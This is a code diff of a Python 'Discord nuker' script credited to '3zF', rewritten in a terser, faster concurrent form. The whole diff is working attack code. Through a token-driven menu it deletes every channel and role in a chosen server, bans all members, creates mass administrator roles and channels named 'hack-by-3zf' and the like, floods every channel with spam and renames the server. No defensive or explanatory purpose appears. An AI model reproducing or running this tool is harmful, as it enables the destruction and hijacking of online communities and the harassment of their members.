@@ -1,232 +1,120 @@
-import discord, asyncio, os, sys, random, time
+import discord, asyncio, sys, os, random, time
 from discord.ext import commands
-from colorama import init, Fore, Back, Style
-
+from colorama import init, Fore, Style
 init(autoreset=True)
-
-BANNER = f"""
-{Fore.RED}{'='*55}
-{Fore.RED}╔══════════════════════════════════════════╗
-{Fore.RED}║{Fore.WHITE}          DISCORD NUKER - 3zF            {Fore.RED}║
-{Fore.RED}║{Fore.WHITE}          ~ Tools By 3zF ~               {Fore.RED}║
-{Fore.RED}╚══════════════════════════════════════════╝
-{Fore.RED}{'='*55}
-
-{Fore.RED}██████╗  ██████╗ ███████╗███████╗{Style.RESET_ALL}
-{Fore.RED}╚════██╗██╔═████╗██╔════╝██╔════╝{Style.RESET_ALL}
-{Fore.RED} █████╔╝██║██╔██║███████╗███████╗{Style.RESET_ALL}
-{Fore.RED} ╚═══██╗████╔╝██║╚════██║╚════██║{Style.RESET_ALL}
-{Fore.RED}██████╔╝╚██████╔╝███████║███████║{Style.RESET_ALL}
-{Fore.RED}╚═════╝  ╚═════╝ ╚══════╝╚══════╝{Style.RESET_ALL}
-
-{Fore.YELLOW}             Made by 3zF{Style.RESET_ALL}
+os.system("cls||clear")
+B=Fore.RED+"""
+╔══════════════════════════════════════════════════════╗
+║██████╗  ██████╗ ███████╗███████╗                    ║
+║╚════██╗██╔═████╗██╔════╝██╔════╝                    ║
+║ █████╔╝██║██╔██║███████╗███████╗                    ║
+║ ╚═══██╗████╔╝██║╚════██║╚════██║                    ║
+║██████╔╝╚██████╔╝███████║███████║                    ║
+║╚═════╝  ╚═════╝ ╚══════╝╚══════╝                    ║
+╚══════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════╗
+║               Developer by 3zF                     ║
+╚══════════════════════════════════════════════════════╝
 """
-
-def show_banner(logged_as=None):
-    os.system("cls || clear")
-    print(BANNER)
-    if logged_as:
-        print(f"{Fore.GREEN}[+] Logged as {logged_as}{Style.RESET_ALL}")
-
-show_banner()
-
-token = input(f"{Fore.CYAN}> Token: {Style.RESET_ALL}")
-
-intents = discord.Intents.all()
-client = commands.Bot(command_prefix="!", intents=intents, help_command=None)
-
-guild_target = None
-running = True
-
+print(B)
+token=input(Fore.RED+" [TOKEN] > "+Fore.WHITE)
+intents=discord.Intents.all()
+client=commands.Bot(command_prefix="!",intents=intents,help_command=None)
+gt=None
+r=True
+CN=["hack-by-3zf","nuker-by-3zf","destroyed-by-3zf"]
+RN=["3zf-admin","3zf-owner","3zf-hacker"]
 @client.event
 async def on_ready():
-    global guild_target
-    show_banner(client.user)
-
-    guilds = list(client.guilds)
-    print(f"{Fore.YELLOW}> Servers:{Style.RESET_ALL}")
-    for i, g in enumerate(guilds):
-        print(f"  {Fore.CYAN}{i+1}. {g.name} ({g.id}){Style.RESET_ALL}")
-
-    while True:
-        try:
-            choice = int(input(f"\n{Fore.CYAN}> Choose server number: {Style.RESET_ALL}")) - 1
-            if choice < 0 or choice >= len(guilds):
-                print(f"{Fore.RED}[-] Invalid number{Style.RESET_ALL}")
-                continue
-            guild_target = guilds[choice]
-            break
-        except:
-            print(f"{Fore.RED}[-] Enter a valid number{Style.RESET_ALL}")
-
-    print(f"\n{Fore.GREEN}[+] Selected: {guild_target.name}{Style.RESET_ALL}")
-    await main_menu()
-
-async def main_menu():
-    global running
-    while running:
-        print(f"\n{Fore.RED}{'='*55}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}  Server: {Fore.WHITE}{guild_target.name}{Style.RESET_ALL}")
-        print(f"{Fore.RED}{'='*55}{Style.RESET_ALL}")
-        print(f"  {Fore.RED}1{Fore.WHITE} > {Fore.CYAN}Delete All Channels{Style.RESET_ALL}")
-        print(f"  {Fore.RED}2{Fore.WHITE} > {Fore.CYAN}Create Channels{Style.RESET_ALL}")
-        print(f"  {Fore.RED}3{Fore.WHITE} > {Fore.CYAN}Ban All Members{Style.RESET_ALL}")
-        print(f"  {Fore.RED}4{Fore.WHITE} > {Fore.CYAN}Delete All Roles{Style.RESET_ALL}")
-        print(f"  {Fore.RED}5{Fore.WHITE} > {Fore.CYAN}Create Roles{Style.RESET_ALL}")
-        print(f"  {Fore.RED}6{Fore.WHITE} > {Fore.CYAN}Spam All{Style.RESET_ALL}")
-        print(f"  {Fore.RED}7{Fore.WHITE} > {Fore.CYAN}Change Server Name{Style.RESET_ALL}")
-        print(f"  {Fore.RED}8{Fore.WHITE} > {Fore.CYAN}Exit{Style.RESET_ALL}")
-        print(f"{Fore.RED}{'='*55}{Style.RESET_ALL}")
-
-        choice = input(f"\n{Fore.CYAN}> Choose: {Style.RESET_ALL}").strip()
-
-        if choice == "1":
-            await delete_all_channels()
-        elif choice == "2":
-            await create_channels()
-        elif choice == "3":
-            await ban_all()
-        elif choice == "4":
-            await delete_all_roles()
-        elif choice == "5":
-            await create_roles()
-        elif choice == "6":
-            await spam_all()
-        elif choice == "7":
-            await change_name()
-        elif choice == "8":
-            running = False
-            print(f"{Fore.GREEN}[+] Exited{Style.RESET_ALL}")
-            await client.close()
-            sys.exit(0)
-        else:
-            print(f"{Fore.RED}[-] Wrong number{Style.RESET_ALL}")
-
-async def delete_all_channels():
-    print(f"\n{Fore.YELLOW}[+] Deleting all channels...{Style.RESET_ALL}")
-    count = 0
-    for channel in guild_target.channels:
-        try:
-            await channel.delete()
-            count += 1
-        except:
-            pass
-    print(f"{Fore.GREEN}[+] Deleted {count} channels{Style.RESET_ALL}")
-
-async def create_channels():
-    try:
-        num = int(input(f"{Fore.CYAN}> How many channels: {Style.RESET_ALL}"))
-    except:
-        print(f"{Fore.RED}[-] Number only{Style.RESET_ALL}")
-        return
-    name = input(f"{Fore.CYAN}> Channel name (ex: nuke-by-3zf): {Style.RESET_ALL}")
-    cat_id = input(f"{Fore.CYAN}> Category ID (leave empty for none): {Style.RESET_ALL}").strip()
-
-    print(f"{Fore.YELLOW}[+] Creating channels...{Style.RESET_ALL}")
-    count = 0
-    for i in range(num):
-        try:
-            if cat_id:
-                cat = client.get_channel(int(cat_id))
-                if cat:
-                    await guild_target.create_text_channel(f"{name}-{i+1}", category=cat)
-                else:
-                    await guild_target.create_text_channel(f"{name}-{i+1}")
-            else:
-                await guild_target.create_text_channel(f"{name}-{i+1}")
-            count += 1
-        except:
-            pass
-    print(f"{Fore.GREEN}[+] Created {count} channels{Style.RESET_ALL}")
-
-async def ban_all():
-    confirm = input(f"{Fore.RED}> Sure you want to ban everyone? (yes/no): {Style.RESET_ALL}")
-    if confirm.lower() != "yes":
-        print(f"{Fore.RED}[-] Cancelled{Style.RESET_ALL}")
-        return
-
-    print(f"{Fore.YELLOW}[+] Banning all members...{Style.RESET_ALL}")
-    await guild_target.fetch_members()
-    count = 0
-    for member in guild_target.members:
-        if member.id == client.user.id:
-            continue
-        try:
-            await member.ban(reason="Nuked by 3zF")
-            count += 1
-        except:
-            pass
-    print(f"{Fore.GREEN}[+] Banned {count} members{Style.RESET_ALL}")
-
-async def delete_all_roles():
-    print(f"{Fore.YELLOW}[+] Deleting all roles...{Style.RESET_ALL}")
-    count = 0
-    for role in guild_target.roles:
-        if role.name == "@everyone":
-            continue
-        try:
-            await role.delete()
-            count += 1
-        except:
-            pass
-    print(f"{Fore.GREEN}[+] Deleted {count} roles{Style.RESET_ALL}")
-
-async def create_roles():
-    try:
-        num = int(input(f"{Fore.CYAN}> How many roles: {Style.RESET_ALL}"))
-    except:
-        print(f"{Fore.RED}[-] Number only{Style.RESET_ALL}")
-        return
-    name = input(f"{Fore.CYAN}> Role name: {Style.RESET_ALL}")
-    color_input = input(f"{Fore.CYAN}> Color (Hex like #FF0000 or type random): {Style.RESET_ALL}").strip()
-
-    print(f"{Fore.YELLOW}[+] Creating roles...{Style.RESET_ALL}")
-    count = 0
-    for i in range(num):
-        try:
-            if color_input.lower() == "random":
-                color = random.randint(0, 0xFFFFFF)
-            else:
-                color = int(color_input.replace("#", ""), 16)
-            await guild_target.create_role(
-                name=f"{name}-{i+1}",
-                color=discord.Color(color),
-                permissions=discord.Permissions(administrator=True)
-            )
-            count += 1
-        except:
-            pass
-    print(f"{Fore.GREEN}[+] Created {count} roles{Style.RESET_ALL}")
-
-async def spam_all():
-    try:
-        count = int(input(f"{Fore.CYAN}> How many messages per channel: {Style.RESET_ALL}"))
-    except:
-        print(f"{Fore.RED}[-] Number only{Style.RESET_ALL}")
-        return
-    msg = input(f"{Fore.CYAN}> Message: {Style.RESET_ALL}")
-
-    print(f"{Fore.YELLOW}[+] Spamming...{Style.RESET_ALL} {Fore.RED}🔥{Style.RESET_ALL}")
-    sent = 0
-    for i in range(count):
-        for channel in guild_target.text_channels:
-            try:
-                await channel.send(msg)
-                sent += 1
-            except:
-                pass
-    print(f"{Fore.GREEN}[+] Sent {sent} messages{Style.RESET_ALL}")
-
-async def change_name():
-    name = input(f"{Fore.CYAN}> New server name: {Style.RESET_ALL}")
-    try:
-        await guild_target.edit(name=name)
-        print(f"{Fore.GREEN}[+] Server name changed to: {name}{Style.RESET_ALL}")
-    except:
-        print(f"{Fore.RED}[-] Failed to change name{Style.RESET_ALL}")
-
-try:
-    client.run(token)
-except:
-    print(f"{Fore.RED}[-] Invalid token{Style.RESET_ALL}")
-    sys.exit(1)
+ global gt
+ os.system("cls||clear")
+ print(B)
+ print(Fore.RED+"╔══════════════════════════════════════════════════════╗")
+ print(Fore.RED+"║"+Fore.WHITE+"           ✅ "+str(client.user)+Fore.RED+"           ║")
+ print(Fore.RED+"╚══════════════════════════════════════════════════════╝")
+ gs=list(client.guilds)
+ for i,g in enumerate(gs):print(Fore.RED+" ["+Fore.WHITE+str(i+1)+Fore.RED+"] "+Fore.WHITE+g.name+Fore.RED+" ["+Fore.WHITE+str(g.id)+Fore.RED+"]")
+ while True:
+  try:
+   c=int(input(Fore.RED+"\n [SERVER] > "+Fore.WHITE))-1
+   if 0<=c<len(gs):gt=gs[c];break
+  except:pass
+ while r:
+  os.system("cls||clear")
+  print(B)
+  print(Fore.RED+"╔══════════════════════════════════════════════════════╗")
+  print(Fore.RED+"║"+Fore.WHITE+"               "+gt.name+Fore.RED+"               ║")
+  print(Fore.RED+"╚══════════════════════════════════════════════════════╝")
+  print(Fore.RED+"┌──────────────────────┬──────────────────────┐")
+  print(Fore.RED+"│"+Fore.WHITE+"  [01] DEL CH        "+Fore.RED+"│"+Fore.WHITE+"  [05] DEL ROL      "+Fore.RED+"│")
+  print(Fore.RED+"├──────────────────────┼──────────────────────┤")
+  print(Fore.RED+"│"+Fore.WHITE+"  [02] MAKE CH        "+Fore.RED+"│"+Fore.WHITE+"  [06] MAKE ROL     "+Fore.RED+"│")
+  print(Fore.RED+"├──────────────────────┼──────────────────────┤")
+  print(Fore.RED+"│"+Fore.WHITE+"  [03] BAN ALL        "+Fore.RED+"│"+Fore.WHITE+"  [07] SPAM        "+Fore.RED+"│")
+  print(Fore.RED+"├──────────────────────┼──────────────────────┤")
+  print(Fore.RED+"│"+Fore.WHITE+"  [04] RENAME         "+Fore.RED+"│"+Fore.WHITE+"  [08] EXIT        "+Fore.RED+"│")
+  print(Fore.RED+"└──────────────────────┴──────────────────────┘")
+  c=input(Fore.RED+" > "+Fore.WHITE).strip()
+  if c in["1","01"]:
+   n=[0]
+   async def d(ch):
+    try:await ch.delete();n[0]+=1
+    except:pass
+   await asyncio.gather(*[d(ch) for ch in list(gt.channels)])
+   print(Fore.GREEN+" DONE "+str(n[0])+" CH");time.sleep(1)
+  elif c in["2","02"]:
+   try:num=int(input(Fore.RED+" COUNT > "+Fore.WHITE))
+   except:continue
+   n=[0]
+   async def m(i):
+    try:await gt.create_text_channel(CN[i%3]);n[0]+=1
+    except:pass
+   for i in range(0,num,10):await asyncio.gather(*[m(i+j) for j in range(min(10,num-i))])
+   print(Fore.GREEN+" DONE "+str(n[0])+" CH");time.sleep(1)
+  elif c in["3","03"]:
+   if input(Fore.RED+" BAN? (y/n) > "+Fore.WHITE).lower()!="y":continue
+   await gt.fetch_members()
+   n=[0]
+   async def b(m):
+    if m.id!=client.user.id:
+     try:await m.ban(reason="3zF");n[0]+=1
+     except:pass
+   mems=list(gt.members)
+   for i in range(0,len(mems),5):await asyncio.gather(*[b(m) for m in mems[i:i+5]])
+   print(Fore.GREEN+" DONE "+str(n[0])+" MEM");time.sleep(1)
+  elif c in["4","04"]:
+   try:await gt.edit(name=input(Fore.RED+" NAME > "+Fore.WHITE));print(Fore.GREEN+" DONE")
+   except:print(Fore.RED+" X");time.sleep(1)
+  elif c in["5","05"]:
+   n=[0]
+   async def rr(role):
+    if role.name not in["@everyone",gt.name]:
+     try:await role.delete();n[0]+=1
+     except:pass
+   await asyncio.gather(*[rr(r) for r in gt.roles])
+   print(Fore.GREEN+" DONE "+str(n[0])+" ROL");time.sleep(1)
+  elif c in["6","06"]:
+   try:num=int(input(Fore.RED+" COUNT > "+Fore.WHITE))
+   except:continue
+   n=[0]
+   async def mr(i):
+    try:await gt.create_role(name=RN[i%3],color=discord.Color(random.randint(0,0xFFFFFF)),permissions=discord.Permissions(administrator=True),hoist=True);n[0]+=1
+    except:pass
+   for i in range(0,num,5):await asyncio.gather(*[mr(i+j) for j in range(min(5,num-i))])
+   print(Fore.GREEN+" DONE "+str(n[0])+" ROL");time.sleep(1)
+  elif c in["7","07"]:
+   try:cc=int(input(Fore.RED+" MSG COUNT > "+Fore.WHITE))
+   except:continue
+   msg=input(Fore.RED+" MSG > "+Fore.WHITE)
+   chs=[ch for ch in gt.text_channels if ch.permissions_for(gt.me).send_messages]
+   if not chs:continue
+   n=[0]
+   async def s(ch):
+    for _ in range(cc):
+     try:await ch.send(msg);n[0]+=1
+     except:pass
+   await asyncio.gather(*[s(ch) for ch in chs])
+   print(Fore.GREEN+" DONE "+str(n[0])+" MSG");time.sleep(1)
+  elif c in["8","08"]:r=False;print(Fore.RED+" BYE");await client.close();break
+try:client.run(token)
+except:print(Fore.RED+" X TOKEN");time.sleep(2);os.execl(sys.executable,sys.executable,*sys.argv)
